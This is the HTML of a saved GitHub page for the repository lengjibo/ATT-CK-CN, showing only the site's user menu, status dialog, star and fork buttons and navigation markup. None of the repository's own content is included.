    <summary class="btn-link btn-block link-gray no-underline js-toggle-user-status-edit toggle-user-status-edit " role="menuitem" data-hydro-click="{&quot;event_type&quot;:&quot;user_profile.click&quot;,&quot;payload&quot;:{&quot;profile_user_id&quot;:31297202,&quot;target&quot;:&quot;EDIT_USER_STATUS&quot;,&quot;user_id&quot;:52145536,&quot;client_id&quot;:&quot;1810189015.1566446191&quot;,&quot;originating_request_id&quot;:&quot;9AC0:0628:8141B5:B84344:5D7617E4&quot;,&quot;originating_url&quot;:&quot;https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md&quot;,&quot;referrer&quot;:null}}" data-hydro-click-hmac="500d04757230747cb7a606e2a1cd8a4984579c20e65f5af8f61e936caaa2b601">
      <div class="d-flex">
        <div class="f6 lh-condensed user-status-header
          d-inline-block v-align-middle
            user-status-emoji-only-header circle
            pr-2
" style="max-width: 29px">
          <div class="user-status-emoji-container flex-shrink-0 mr-1 mt-1 lh-condensed-ultra v-align-bottom" style="">
            <svg class="octicon octicon-smiley" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm4.81 12.81a6.72 6.72 0 0 1-2.17 1.45c-.83.36-1.72.53-2.64.53-.92 0-1.81-.17-2.64-.53-.81-.34-1.55-.83-2.17-1.45a6.773 6.773 0 0 1-1.45-2.17A6.59 6.59 0 0 1 1.21 8c0-.92.17-1.81.53-2.64.34-.81.83-1.55 1.45-2.17.62-.62 1.36-1.11 2.17-1.45A6.59 6.59 0 0 1 8 1.21c.92 0 1.81.17 2.64.53.81.34 1.55.83 2.17 1.45.62.62 1.11 1.36 1.45 2.17.36.83.53 1.72.53 2.64 0 .92-.17 1.81-.53 2.64-.34.81-.83 1.55-1.45 2.17zM4 6.8v-.59c0-.66.53-1.19 1.2-1.19h.59c.66 0 1.19.53 1.19 1.19v.59c0 .67-.53 1.2-1.19 1.2H5.2C4.53 8 4 7.47 4 6.8zm5 0v-.59c0-.66.53-1.19 1.2-1.19h.59c.66 0 1.19.53 1.19 1.19v.59c0 .67-.53 1.2-1.19 1.2h-.59C9.53 8 9 7.47 9 6.8zm4 3.2c-.72 1.88-2.91 3-5 3s-4.28-1.13-5-3c-.14-.39.23-1 .66-1h8.59c.41 0 .89.61.75 1z"></path></svg>
          </div>
        </div>
        <div class="
          d-inline-block v-align-middle
          
          
           css-truncate css-truncate-target 
           user-status-message-wrapper f6" style="line-height: 20px;">
          <div class="d-inline-block text-gray-dark v-align-text-top text-left">
              <span class="text-gray ml-2">Set status</span>
          </div>
        </div>
      </div>
    </summary>
    <details-dialog class="details-dialog rounded-1 anim-fade-in fast Box Box--overlay" role="dialog" tabindex="-1" aria-modal="true">
      <!-- '"` --><!-- </textarea></xmp> --><form class="position-relative flex-auto js-user-status-form" action="https://github.com/users/status?compact=1&amp;link_mentions=0&amp;truncate=1" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="_method" value="put"><input type="hidden" name="authenticity_token" value="uebQkDejozYdrHulf6CNtviw6mCCGFBgI9dWhnwF2/n4JhBRSZzl/Go19X2MJOn0M/92amCgHIuxfJszPGPYsw==">
        <div class="Box-header bg-gray border-bottom p-3">
          <button class="Box-btn-octicon js-toggle-user-status-edit btn-octicon float-right" type="reset" aria-label="Close dialog" data-close-dialog="">
            <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"></path></svg>
          </button>
          <h3 class="Box-title f5 text-bold text-gray-dark">Edit status</h3>
        </div>
        <input type="hidden" name="emoji" class="js-user-status-emoji-field" value="">
        <input type="hidden" name="organization_id" class="js-user-status-org-id-field" value="">
        <div class="px-3 py-2 text-gray-dark">
          <div class="js-characters-remaining-container position-relative mt-2">
            <div class="input-group d-table form-group my-0 js-user-status-form-group">
              <span class="input-group-button d-table-cell v-align-middle" style="width: 1%">
                <button type="button" aria-label="Choose an emoji" class="btn-outline btn js-toggle-user-status-emoji-picker btn-open-emoji-picker p-0">
                  <span class="js-user-status-original-emoji" hidden=""></span>
                  <span class="js-user-status-custom-emoji"></span>
                  <span class="js-user-status-no-emoji-icon">
                    <svg class="octicon octicon-smiley" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm4.81 12.81a6.72 6.72 0 0 1-2.17 1.45c-.83.36-1.72.53-2.64.53-.92 0-1.81-.17-2.64-.53-.81-.34-1.55-.83-2.17-1.45a6.773 6.773 0 0 1-1.45-2.17A6.59 6.59 0 0 1 1.21 8c0-.92.17-1.81.53-2.64.34-.81.83-1.55 1.45-2.17.62-.62 1.36-1.11 2.17-1.45A6.59 6.59 0 0 1 8 1.21c.92 0 1.81.17 2.64.53.81.34 1.55.83 2.17 1.45.62.62 1.11 1.36 1.45 2.17.36.83.53 1.72.53 2.64 0 .92-.17 1.81-.53 2.64-.34.81-.83 1.55-1.45 2.17zM4 6.8v-.59c0-.66.53-1.19 1.2-1.19h.59c.66 0 1.19.53 1.19 1.19v.59c0 .67-.53 1.2-1.19 1.2H5.2C4.53 8 4 7.47 4 6.8zm5 0v-.59c0-.66.53-1.19 1.2-1.19h.59c.66 0 1.19.53 1.19 1.19v.59c0 .67-.53 1.2-1.19 1.2h-.59C9.53 8 9 7.47 9 6.8zm4 3.2c-.72 1.88-2.91 3-5 3s-4.28-1.13-5-3c-.14-.39.23-1 .66-1h8.59c.41 0 .89.61.75 1z"></path></svg>
                  </span>
                </button>
              </span>
              <text-expander keys=": @" data-mention-url="/autocomplete/user-suggestions" data-emoji-url="/autocomplete/emoji">
                <input type="text" autocomplete="off" data-no-org-url="/autocomplete/user-suggestions" data-org-url="/suggestions?mention_suggester=1" data-maxlength="80" class="d-table-cell width-full form-control js-user-status-message-field js-characters-remaining-field" placeholder="What&#39;s happening?" name="message" value="" aria-label="What is your current status?">
              </text-expander>
              <div class="error">Could not update your status, please try again.</div>
            </div>
            <div style="margin-left: 53px" class="my-1 text-small label-characters-remaining js-characters-remaining" data-suffix="remaining" hidden="">
              80 remaining
            </div>
          </div>
          <include-fragment class="js-user-status-emoji-picker" data-url="/users/status/emoji"></include-fragment>
          <div class="overflow-auto ml-n3 mr-n3 px-3 border-bottom" style="max-height: 33vh">
            <div class="user-status-suggestions js-user-status-suggestions collapsed overflow-hidden">
              <h4 class="f6 text-normal my-3">Suggestions:</h4>
              <div class="mx-3 mt-2 clearfix">
                  <div class="float-left col-6">
                      <button type="button" value=":palm_tree:" class="d-flex flex-items-baseline flex-items-stretch lh-condensed f6 btn-link link-gray no-underline js-predefined-user-status mb-1">
                        <div class="emoji-status-width mr-2 v-align-middle js-predefined-user-status-emoji">
                          <g-emoji alias="palm_tree" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f334.png">🌴</g-emoji>
                        </div>
                        <div class="d-flex flex-items-center no-underline js-predefined-user-status-message ws-normal text-left" style="border-left: 1px solid transparent">
                          On vacation
                        </div>
                      </button>
                      <button type="button" value=":face_with_thermometer:" class="d-flex flex-items-baseline flex-items-stretch lh-condensed f6 btn-link link-gray no-underline js-predefined-user-status mb-1">
                        <div class="emoji-status-width mr-2 v-align-middle js-predefined-user-status-emoji">
                          <g-emoji alias="face_with_thermometer" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f912.png">🤒</g-emoji>
                        </div>
                        <div class="d-flex flex-items-center no-underline js-predefined-user-status-message ws-normal text-left" style="border-left: 1px solid transparent">
                          Out sick
                        </div>
                      </button>
                  </div>
                  <div class="float-left col-6">
                      <button type="button" value=":house:" class="d-flex flex-items-baseline flex-items-stretch lh-condensed f6 btn-link link-gray no-underline js-predefined-user-status mb-1">
                        <div class="emoji-status-width mr-2 v-align-middle js-predefined-user-status-emoji">
                          <g-emoji alias="house" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f3e0.png">🏠</g-emoji>
                        </div>
                        <div class="d-flex flex-items-center no-underline js-predefined-user-status-message ws-normal text-left" style="border-left: 1px solid transparent">
                          Working from home
                        </div>
                      </button>
                      <button type="button" value=":dart:" class="d-flex flex-items-baseline flex-items-stretch lh-condensed f6 btn-link link-gray no-underline js-predefined-user-status mb-1">
                        <div class="emoji-status-width mr-2 v-align-middle js-predefined-user-status-emoji">
                          <g-emoji alias="dart" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f3af.png">🎯</g-emoji>
                        </div>
                        <div class="d-flex flex-items-center no-underline js-predefined-user-status-message ws-normal text-left" style="border-left: 1px solid transparent">
                          Focusing
                        </div>
                      </button>
                  </div>
              </div>
            </div>
            <div class="user-status-limited-availability-container">
              <div class="form-checkbox my-0">
                <input type="checkbox" name="limited_availability" value="1" class="js-user-status-limited-availability-checkbox" data-default-message="I may be slow to respond." aria-describedby="limited-availability-help-text-truncate-true-compact-true" id="limited-availability-truncate-true-compact-true">
                <label class="d-block f5 text-gray-dark mb-1" for="limited-availability-truncate-true-compact-true">
                  Busy
                </label>
                <p class="note" id="limited-availability-help-text-truncate-true-compact-true">
                  When others mention you, assign you, or request your review,
                  GitHub will let them know that you have limited availability.
                </p>
              </div>
            </div>
          </div>
            

<div class="d-inline-block f5 mr-2 pt-3 pb-2">
  <div class="d-inline-block mr-1">
    Clear status
  </div>

  <details class="js-user-status-expire-drop-down f6 dropdown details-reset details-overlay d-inline-block mr-2">
    <summary class="f5 btn-link link-gray-dark border px-2 py-1 rounded-1" aria-haspopup="true">
      <div class="js-user-status-expiration-interval-selected d-inline-block v-align-baseline">
        Never
      </div>
      <div class="dropdown-caret"></div>
    </summary>

    <ul class="dropdown-menu dropdown-menu-se pl-0 overflow-auto" style="width: 220px; max-height: 15.5em">
      <li>
        <button type="button" class="btn-link dropdown-item js-user-status-expire-button ws-normal" title="Never">
          <span class="d-inline-block text-bold mb-1">Never</span>
          <div class="f6 lh-condensed">Keep this status until you clear your status or edit your status.</div>
        </button>
      </li>
      <li class="dropdown-divider" role="none"></li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="in 30 minutes" value="2019-09-09T17:44:13+08:00">
            in 30 minutes
          </button>
        </li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="in 1 hour" value="2019-09-09T18:14:13+08:00">
            in 1 hour
          </button>
        </li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="in 4 hours" value="2019-09-09T21:14:13+08:00">
            in 4 hours
          </button>
        </li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="today" value="2019-09-09T23:59:59+08:00">
            today
          </button>
        </li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="this week" value="2019-09-15T23:59:59+08:00">
            this week
          </button>
        </li>
    </ul>
  </details>
  <input class="js-user-status-expiration-date-input" type="hidden" name="expires_at" value="">
</div>

          <include-fragment class="js-user-status-org-picker" data-url="/users/status/organizations"></include-fragment>
        </div>
        <div class="d-flex flex-items-center flex-justify-between p-3 border-top">
          <button type="submit" disabled="" class="width-full btn btn-primary mr-2 js-user-status-submit">
            Set status
          </button>
          <button type="button" disabled="" class="width-full js-clear-user-status-button btn ml-2 ">
            Clear status
          </button>
        </div>
</form>    </details-dialog>
  </details>
</div>

      </div>
      <div role="none" class="dropdown-divider"></div>


    <a role="menuitem" class="dropdown-item" href="https://github.com/xidaner" data-ga-click="Header, go to profile, text:your profile">Your profile</a>


    <a role="menuitem" class="dropdown-item" href="https://github.com/xidaner?tab=repositories" data-ga-click="Header, go to repositories, text:your repositories">Your repositories</a>

    <a role="menuitem" class="dropdown-item" href="https://github.com/xidaner?tab=projects" data-ga-click="Header, go to projects, text:your projects">Your projects</a>

    <a role="menuitem" class="dropdown-item" href="https://github.com/xidaner?tab=stars" data-ga-click="Header, go to starred repos, text:your stars">Your stars</a>
      <a role="menuitem" class="dropdown-item" href="https://gist.github.com/mine" data-ga-click="Header, your gists, text:your gists">Your gists</a>


    <div role="none" class="dropdown-divider"></div>
    <a role="menuitem" class="dropdown-item" href="https://help.github.com/" data-ga-click="Header, go to help, text:help">Help</a>
    <a role="menuitem" class="dropdown-item" href="https://github.com/settings/profile" data-ga-click="Header, go to settings, icon:settings">Settings</a>
    <!-- '"` --><!-- </textarea></xmp> --><form class="logout-form" action="https://github.com/logout" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="dmBMXlRVICYV5SPFn+vz+KZvwCEWcqtsszVUCO6vggS6RfsvCy8OclrM0YEZP5oiN8aJj7VuokjEBp11zjejHQ==">
      
      <button type="submit" class="dropdown-item dropdown-signout" data-ga-click="Header, sign out, icon:logout" role="menuitem">
        Sign out
      </button>
</form>  </details-menu>
</details>

    </div>

  </header>

      

  </div>

  <div id="start-of-content" class="show-on-focus"></div>


    <div id="js-flash-container">

</div>



  <div class="application-main " data-commit-hovercards-enabled="">
        <div itemscope="" itemtype="http://schema.org/SoftwareSourceCode" class="">
    <main>
      


  










  <div class="pagehead repohead instapaper_ignore readability-menu experiment-repo-nav pt-0 pt-lg-4 ">
    <div class="repohead-details-container clearfix container-lg p-responsive d-none d-lg-block">

      <ul class="pagehead-actions">



    <li hidden="">
      

    </li>

  <li>
    
    <!-- '"` --><!-- </textarea></xmp> --><form data-remote="true" class="clearfix js-social-form js-social-container" action="https://github.com/notifications/subscribe" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="6VAluf+TkPkInjCy6vtzic/T39NV+tSCamNZ0Y8/NP48WunW//CnoZj/0wM110FcnPUmQlhy8GQCVs8Z0/QpBg==">      <input type="hidden" name="repository_id" value="206977267">

      <details class="details-reset details-overlay select-menu float-left">
        <summary class="select-menu-button float-left btn btn-sm btn-with-count" data-hydro-click="{&quot;event_type&quot;:&quot;repository.click&quot;,&quot;payload&quot;:{&quot;target&quot;:&quot;WATCH_BUTTON&quot;,&quot;repository_id&quot;:206977267,&quot;client_id&quot;:&quot;1810189015.1566446191&quot;,&quot;originating_request_id&quot;:&quot;9AC0:0628:8141B5:B84344:5D7617E4&quot;,&quot;originating_url&quot;:&quot;https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md&quot;,&quot;referrer&quot;:null,&quot;user_id&quot;:52145536}}" data-hydro-click-hmac="3099e44d1d97275a54f1e813f017addc2f4fe5d4b860e9a409533f0cbf728ecc" data-ga-click="Repository, click Watch settings, action:blob#show" aria-haspopup="menu">          <span data-menu-button="">
              <svg class="octicon octicon-eye v-align-text-bottom" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.06 2C3 2 0 8 0 8s3 6 8.06 6C13 14 16 8 16 8s-3-6-7.94-6zM8 12c-2.2 0-4-1.78-4-4 0-2.2 1.8-4 4-4 2.22 0 4 1.8 4 4 0 2.22-1.78 4-4 4zm2-4c0 1.11-.89 2-2 2-1.11 0-2-.89-2-2 0-1.11.89-2 2-2 1.11 0 2 .89 2 2z"></path></svg>
              Watch
          </span>
</summary>        <details-menu class="select-menu-modal position-absolute mt-5" style="z-index: 99;" role="menu">
          <div class="select-menu-header">
            <span class="select-menu-title">Notifications</span>
          </div>
          <div class="select-menu-list">
            <button type="submit" name="do" value="included" class="select-menu-item width-full" aria-checked="true" role="menuitemradio">
              <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 5l-8 8-4-4 1.5-1.5L4 10l6.5-6.5L12 5z"></path></svg>
              <div class="select-menu-item-text">
                <span class="select-menu-item-heading">Not watching</span>
                <span class="description">Be notified only when participating or @mentioned.</span>
                <span class="hidden-select-button-text" data-menu-button-contents="">
                  <svg class="octicon octicon-eye v-align-text-bottom" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.06 2C3 2 0 8 0 8s3 6 8.06 6C13 14 16 8 16 8s-3-6-7.94-6zM8 12c-2.2 0-4-1.78-4-4 0-2.2 1.8-4 4-4 2.22 0 4 1.8 4 4 0 2.22-1.78 4-4 4zm2-4c0 1.11-.89 2-2 2-1.11 0-2-.89-2-2 0-1.11.89-2 2-2 1.11 0 2 .89 2 2z"></path></svg>
                  Watch
                </span>
              </div>
            </button>

            <button type="submit" name="do" value="release_only" class="select-menu-item width-full" aria-checked="false" role="menuitemradio">
              <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 5l-8 8-4-4 1.5-1.5L4 10l6.5-6.5L12 5z"></path></svg>
              <div class="select-menu-item-text">
                <span class="select-menu-item-heading">Releases only</span>
                <span class="description">Be notified of new releases, and when participating or @mentioned.</span>
                <span class="hidden-select-button-text" data-menu-button-contents="">
                  <svg class="octicon octicon-eye v-align-text-bottom" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.06 2C3 2 0 8 0 8s3 6 8.06 6C13 14 16 8 16 8s-3-6-7.94-6zM8 12c-2.2 0-4-1.78-4-4 0-2.2 1.8-4 4-4 2.22 0 4 1.8 4 4 0 2.22-1.78 4-4 4zm2-4c0 1.11-.89 2-2 2-1.11 0-2-.89-2-2 0-1.11.89-2 2-2 1.11 0 2 .89 2 2z"></path></svg>
                  Unwatch releases
                </span>
              </div>
            </button>

            <button type="submit" name="do" value="subscribed" class="select-menu-item width-full" aria-checked="false" role="menuitemradio">
              <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 5l-8 8-4-4 1.5-1.5L4 10l6.5-6.5L12 5z"></path></svg>
              <div class="select-menu-item-text">
                <span class="select-menu-item-heading">Watching</span>
                <span class="description">Be notified of all conversations.</span>
                <span class="hidden-select-button-text" data-menu-button-contents="">
                  <svg class="octicon octicon-eye v-align-text-bottom" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.06 2C3 2 0 8 0 8s3 6 8.06 6C13 14 16 8 16 8s-3-6-7.94-6zM8 12c-2.2 0-4-1.78-4-4 0-2.2 1.8-4 4-4 2.22 0 4 1.8 4 4 0 2.22-1.78 4-4 4zm2-4c0 1.11-.89 2-2 2-1.11 0-2-.89-2-2 0-1.11.89-2 2-2 1.11 0 2 .89 2 2z"></path></svg>
                  Unwatch
                </span>
              </div>
            </button>

            <button type="submit" name="do" value="ignore" class="select-menu-item width-full" aria-checked="false" role="menuitemradio">
              <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 5l-8 8-4-4 1.5-1.5L4 10l6.5-6.5L12 5z"></path></svg>
              <div class="select-menu-item-text">
                <span class="select-menu-item-heading">Ignoring</span>
                <span class="description">Never be notified.</span>
                <span class="hidden-select-button-text" data-menu-button-contents="">
                  <svg class="octicon octicon-mute v-align-text-bottom" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 2.81v10.38c0 .67-.81 1-1.28.53L3 10H1c-.55 0-1-.45-1-1V7c0-.55.45-1 1-1h2l3.72-3.72C7.19 1.81 8 2.14 8 2.81zm7.53 3.22l-1.06-1.06-1.97 1.97-1.97-1.97-1.06 1.06L11.44 8 9.47 9.97l1.06 1.06 1.97-1.97 1.97 1.97 1.06-1.06L13.56 8l1.97-1.97z"></path></svg>
                  Stop ignoring
                </span>
              </div>
            </button>
          </div>
        </details-menu>
      </details>
        <a class="social-count js-social-count" href="https://github.com/lengjibo/ATT-CK-CN/watchers" aria-label="0 users are watching this repository">
          0
        </a>
</form>
  </li>

  <li>
      <div class="js-toggler-container js-social-container starring-container ">
    <!-- '"` --><!-- </textarea></xmp> --><form class="starred js-social-form" action="https://github.com/lengjibo/ATT-CK-CN/unstar" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="aWt8HqQ2xVlKJgaOZBsJBqjDV/XHU5PkCV0pGsey8fD+ksjivfBASTs1K1Eor4DRnkOqKIQOA2OVEzC7JNba1A==">
      <input type="hidden" name="context" value="repository">
      <button type="submit" class="btn btn-sm btn-with-count js-toggler-target" aria-label="Unstar this repository" title="Unstar lengjibo/ATT-CK-CN" data-hydro-click="{&quot;event_type&quot;:&quot;repository.click&quot;,&quot;payload&quot;:{&quot;target&quot;:&quot;UNSTAR_BUTTON&quot;,&quot;repository_id&quot;:206977267,&quot;client_id&quot;:&quot;1810189015.1566446191&quot;,&quot;originating_request_id&quot;:&quot;9AC0:0628:8141B5:B84344:5D7617E4&quot;,&quot;originating_url&quot;:&quot;https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md&quot;,&quot;referrer&quot;:null,&quot;user_id&quot;:52145536}}" data-hydro-click-hmac="23bc50aae96db54c23560723a0d20d7fd40d9bda9433ed427ab2fdfe9995d84b" data-ga-click="Repository, click unstar button, action:blob#show; text:Unstar">        <svg class="octicon octicon-star v-align-text-bottom" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M14 6l-4.9-.64L7 1 4.9 5.36 0 6l3.6 3.26L2.67 14 7 11.67 11.33 14l-.93-4.74L14 6z"></path></svg>
        Unstar
</button>        <a class="social-count js-social-count" href="https://github.com/lengjibo/ATT-CK-CN/stargazers" aria-label="41 users starred this repository">
           41
        </a>
</form>
    <!-- '"` --><!-- </textarea></xmp> --><form class="unstarred js-social-form" action="https://github.com/lengjibo/ATT-CK-CN/star" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="q1Zz5bYIhl3s85/ACqBW8rWQzgIctWXeENQvWJpTjcme1UXRE2M9QXlWda4pZH/Bh3yT5tuQ30hgzfOLikRyeA==">
      <input type="hidden" name="context" value="repository">
      <button type="submit" class="btn btn-sm btn-with-count js-toggler-target" aria-label="Unstar this repository" title="Star lengjibo/ATT-CK-CN" data-hydro-click="{&quot;event_type&quot;:&quot;repository.click&quot;,&quot;payload&quot;:{&quot;target&quot;:&quot;STAR_BUTTON&quot;,&quot;repository_id&quot;:206977267,&quot;client_id&quot;:&quot;1810189015.1566446191&quot;,&quot;originating_request_id&quot;:&quot;9AC0:0628:8141B5:B84344:5D7617E4&quot;,&quot;originating_url&quot;:&quot;https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md&quot;,&quot;referrer&quot;:null,&quot;user_id&quot;:52145536}}" data-hydro-click-hmac="72870d3a90e2c86579b86ce1090373a7816149365b6ae51cf733ca9b1e0c6190" data-ga-click="Repository, click star button, action:blob#show; text:Star">        <svg class="octicon octicon-star v-align-text-bottom" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M14 6l-4.9-.64L7 1 4.9 5.36 0 6l3.6 3.26L2.67 14 7 11.67 11.33 14l-.93-4.74L14 6z"></path></svg>
        Star
</button>        <a class="social-count js-social-count" href="https://github.com/lengjibo/ATT-CK-CN/stargazers" aria-label="41 users starred this repository">
          41
        </a>
</form>  </div>

  </li>

  <li>
          <!-- '"` --><!-- </textarea></xmp> --><form class="btn-with-count" action="https://github.com/lengjibo/ATT-CK-CN/fork" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="1VITg8Wf7rGb5oOBOBwe7bGRLYhgt9TA2dSfvtNAJx60ZvSfi1zmw5ub9/gN9lnX90qDvGHiUL4R9qdHmG+KjA==">
            <button class="btn btn-sm btn-with-count" data-hydro-click="{&quot;event_type&quot;:&quot;repository.click&quot;,&quot;payload&quot;:{&quot;target&quot;:&quot;FORK_BUTTON&quot;,&quot;repository_id&quot;:206977267,&quot;client_id&quot;:&quot;1810189015.1566446191&quot;,&quot;originating_request_id&quot;:&quot;9AC0:0628:8141B5:B84344:5D7617E4&quot;,&quot;originating_url&quot;:&quot;https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md&quot;,&quot;referrer&quot;:null,&quot;user_id&quot;:52145536}}" data-hydro-click-hmac="a5660d9a90e3ab4a74a898d6a93ce53217c3952c98f3553c057245cb2652d689" data-ga-click="Repository, show fork modal, action:blob#show; text:Fork" type="submit" title="Fork your own copy of lengjibo/ATT-CK-CN to your account" aria-label="Fork your own copy of lengjibo/ATT-CK-CN to your account">              <svg class="octicon octicon-repo-forked v-align-text-bottom" viewBox="0 0 10 16" version="1.1" width="10" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 1a1.993 1.993 0 0 0-1 3.72V6L5 8 3 6V4.72A1.993 1.993 0 0 0 2 1a1.993 1.993 0 0 0-1 3.72V6.5l3 3v1.78A1.993 1.993 0 0 0 5 15a1.993 1.993 0 0 0 1-3.72V9.5l3-3V4.72A1.993 1.993 0 0 0 8 1zM2 4.2C1.34 4.2.8 3.65.8 3c0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2zm3 10c-.66 0-1.2-.55-1.2-1.2 0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2zm3-10c-.66 0-1.2-.55-1.2-1.2 0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2z"></path></svg>
              Fork
</button></form>
    <a href="https://github.com/lengjibo/ATT-CK-CN/network/members" class="social-count" aria-label="7 users forked this repository">
      7
    </a>
  </li>
</ul>

      <h1 class="public ">
    <svg class="octicon octicon-repo" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9H3V8h1v1zm0-3H3v1h1V6zm0-2H3v1h1V4zm0-2H3v1h1V2zm8-1v12c0 .55-.45 1-1 1H6v2l-1.5-1.5L3 16v-2H1c-.55 0-1-.45-1-1V1c0-.55.45-1 1-1h10c.55 0 1 .45 1 1zm-1 10H1v2h2v-1h3v1h5v-2zm0-10H2v9h9V1z"></path></svg>
  <span class="author" itemprop="author"><a class="url fn" rel="author" data-hovercard-type="user" data-hovercard-url="/hovercards?user_id=31297202" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/lengjibo">lengjibo</a></span><!--
--><span class="path-divider">/</span><!--
--><strong itemprop="name"><a data-pjax="#js-repo-pjax-container" href="https://github.com/lengjibo/ATT-CK-CN">ATT-CK-CN</a></strong>
  

</h1>

    </div>
    
<nav class="hx_reponav reponav js-repo-nav js-sidenav-container-pjax container-lg p-responsive d-none d-lg-block" itemscope="" itemtype="http://schema.org/BreadcrumbList" aria-label="Repository" data-pjax="#js-repo-pjax-container">

  <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
    <a class="js-selected-navigation-item selected reponav-item" itemprop="url" data-hotkey="g c" aria-current="page" data-selected-links="repo_source repo_downloads repo_commits repo_releases repo_tags repo_branches repo_packages /lengjibo/ATT-CK-CN" href="https://github.com/lengjibo/ATT-CK-CN">
      <svg class="octicon octicon-code" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M9.5 3L8 4.5 11.5 8 8 11.5 9.5 13 14 8 9.5 3zm-5 0L0 8l4.5 5L6 11.5 2.5 8 6 4.5 4.5 3z"></path></svg>
      <span itemprop="name">Code</span>
      <meta itemprop="position" content="1">
</a>  </span>

    <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
      <a itemprop="url" data-hotkey="g i" class="js-selected-navigation-item reponav-item" data-selected-links="repo_issues repo_labels repo_milestones /lengjibo/ATT-CK-CN/issues" href="https://github.com/lengjibo/ATT-CK-CN/issues">
        <svg class="octicon octicon-issue-opened" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg>
        <span itemprop="name">Issues</span>
        <span class="Counter">0</span>
        <meta itemprop="position" content="2">
</a>    </span>

  <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
    <a data-hotkey="g p" itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="repo_pulls checks /lengjibo/ATT-CK-CN/pulls" href="https://github.com/lengjibo/ATT-CK-CN/pulls">
